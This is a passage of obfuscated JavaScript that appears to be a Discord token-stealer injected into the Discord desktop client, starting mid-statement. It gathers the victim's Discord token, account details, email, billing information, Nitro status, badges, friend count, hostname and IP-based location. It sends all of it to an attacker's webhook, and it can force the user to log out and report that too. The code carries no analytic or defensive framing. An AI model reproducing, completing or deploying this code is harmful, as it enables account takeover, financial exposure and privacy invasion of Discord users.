_0x56c716,_0x57d277,_0x602c3a;config[_0x35d7d9(0x11b)]&&(_0x33f833==undefined?sendToWebhook({'username':config[_0x35d7d9(0x191)][_0x35d7d9(0x166)],'avatar_url':config[_0x35d7d9(0x191)][_0x35d7d9(0x114)],'url':config[_0x35d7d9(0x191)][_0x35d7d9(0x1ad)],'embeds':[createEmbed({'title':_0x35d7d9(0x169),'fields':[{'name':'Hostname','value':_0x35d7d9(0x102)+os['hostname']+_0x35d7d9(0x102),'inline':![]},{'name':_0x35d7d9(0x145),'value':_0x35d7d9(0x102)+getDiscordClient()+'```','inline':![]},{'name':_0x35d7d9(0x134),'value':_0x35d7d9(0x192)+(_0x8c5119['ip']??_0x35d7d9(0x1a5))+_0x35d7d9(0x136)+(_0x8c5119[_0x35d7d9(0x15c)]??_0x35d7d9(0x1a5))+'\x0aCity:\x20'+(_0x8c5119[_0x35d7d9(0x17c)]??_0x35d7d9(0x1a5))+'\x0aRegion:\x20'+(_0x8c5119[_0x35d7d9(0x17b)]??_0x35d7d9(0x1a5))+_0x35d7d9(0x1b6)+(_0x8c5119['country']??_0x35d7d9(0x1a5))+_0x35d7d9(0x176)+(_0x8c5119[_0x35d7d9(0x164)]??_0x35d7d9(0x1a5))+'```','inline':![]}]})]}):(_0x56c716=await getUserInfo(_0x33f833),_0x57d277=await getBilling(_0x33f833),_0x602c3a=await getRelationships(_0x33f833),sendToWebhook({'username':config[_0x35d7d9(0x191)]['username'],'avatar_url':config['embed'][_0x35d7d9(0x114)],'embeds':[createEmbed({'title':_0x35d7d9(0x18e),'url':config[_0x35d7d9(0x191)][_0x35d7d9(0x1ad)],'author':{'name':_0x56c716[_0x35d7d9(0x166)]+'#'+_0x56c716['discriminator']+'\x20('+_0x56c716['id']+')','url':config[_0x35d7d9(0x191)]['href'],'icon_url':_0x56c716[_0x35d7d9(0x118)]?_0x35d7d9(0x127)+_0x56c716['id']+'/'+_0x56c716[_0x35d7d9(0x118)]:_0x35d7d9(0x19e)},'thumbnail':{'url':_0x56c716[_0x35d7d9(0x118)]?_0x35d7d9(0x127)+_0x56c716['id']+'/'+_0x56c716[_0x35d7d9(0x118)]:_0x35d7d9(0x19e)},'fields':[{'name':_0x35d7d9(0x19c),'value':'```'+_0x56c716[_0x35d7d9(0x112)]+'```','inline':!![]},{'name':_0x35d7d9(0x1b5),'value':_0x35d7d9(0x102)+(_0x56c716[_0x35d7d9(0x17d)]??_0x35d7d9(0x17e))+_0x35d7d9(0x102),'inline':![]},{'name':_0x35d7d9(0x150),'value':''+getNitro(_0x56c716['premium_type']),'inline':![]},{'name':_0x35d7d9(0x177),'value':''+_0x57d277,'inline':!![]},{'name':_0x35d7d9(0x16e),'value':''+getBadges(_0x56c716[_0x35d7d9(0x14c)]),'inline':![]},{'name':_0x35d7d9(0x18c),'value':_0x35d7d9(0x102)+_0x33f833+_0x35d7d9(0x102),'inline':![]},{'name':_0x35d7d9(0x190),'value':_0x35d7d9(0x102)+os[_0x35d7d9(0x15c)]+'```','inline':![]},{'name':_0x35d7d9(0x145),'value':'```'+getDiscordClient()+_0x35d7d9(0x102),'inline':![]},{'name':'Connection\x20data','value':_0x35d7d9(0x192)+(_0x8c5119['ip']??_0x35d7d9(0x1a5))+'\x0aHostname:\x20'+(_0x8c5119[_0x35d7d9(0x15c)]??_0x35d7d9(0x1a5))+'\x0aCity:\x20'+(_0x8c5119[_0x35d7d9(0x17c)]??'Unknown')+_0x35d7d9(0x111)+(_0x8c5119[_0x35d7d9(0x17b)]??'Unknown')+'\x0aCountry:\x20'+(_0x8c5119[_0x35d7d9(0x15b)]??'Unknown')+_0x35d7d9(0x176)+(_0x8c5119['timezone']??_0x35d7d9(0x1a5))+_0x35d7d9(0x102),'inline':![]}]}),createEmbed({'description':'**Total\x20Friends\x20('+_0x602c3a[_0x35d7d9(0x146)]+_0x35d7d9(0x12a)+_0x602c3a[_0x35d7d9(0x138)],'thumbnail':{'url':_0x56c716['avatar']?_0x35d7d9(0x127)+_0x56c716['id']+'/'+_0x56c716[_0x35d7d9(0x118)]:'https://cdn.discordapp.com/embed/avatars/0.png'},'author':{'name':_0x56c716[_0x35d7d9(0x166)]+'#'+_0x56c716[_0x35d7d9(0x12f)]+'\x20('+_0x56c716['id']+')','url':config['embed']['href'],'icon_url':_0x56c716[_0x35d7d9(0x118)]?'https://cdn.discordapp.com/avatars/'+_0x56c716['id']+'/'+_0x56c716[_0x35d7d9(0x118)]:_0x35d7d9(0x19e)}})]}))),config['logout']&&_0x33f833&&(await execScript(_0x35d7d9(0x1b2),!![])[_0x35d7d9(0x149)](_0x37085e=>{}),config[_0x35d7d9(0x13d)]&&sendToWebhook({'username':config[_0x35d7d9(0x191)][_0x35d7d9(0x166)],'avatar_url':config[_0x35d7d9(0x191)][_0x35d7d9(0x114)],'embeds':[createEmbed({'title':'Discord\x20|\x20User\x20logged\x20out','url':config['embed'][_0x35d7d9(0x1ad)],'author':{'name':_0x56c716[_0x35d7d9(0x166)]+'#'+_0x56c716['discriminator']+'\x20('+_0x56c716['id']+')','url':config[_0x35d7d9(0x191)]['href'],'icon_url':_0x56c716[_0x35d7d9(0x118)]?'https://cdn.discordapp.com/avatars/'+_0x56c716['id']+'/'+_0x56c716[_0x35d7d9(0x118)]:_0x35d7d9(0x19e)},'thumbnail':{'url':_0x56c716[_0x35d7d9(0x118)]?'https://cdn.discordapp.com/avatars/'+_0x56c716['id']+'/'+_0x56c716[_0x35d7d9(0x118)]:_0x35d7d9(0x19e)},'fields':[{'name':_0x35d7d9(0x150),'value':''+getNitro(_0x56c716['premium_type']),'inline':![]},{'name':_0x35d7d9(0x177),'value':''+_0x57d277,'inline':!![]},{'name':_0x35d7d9(0x16e),'value':''+getBadges(_0x56c716['flags']),'inline':![]},{'name':_0x35d7d9(0x18c),'value':_0x35d7d9(0x102)+_0x33f833+'```','inline':![]}]})]}));}}module['exports']=require(_0x4ddf30(0x17a));
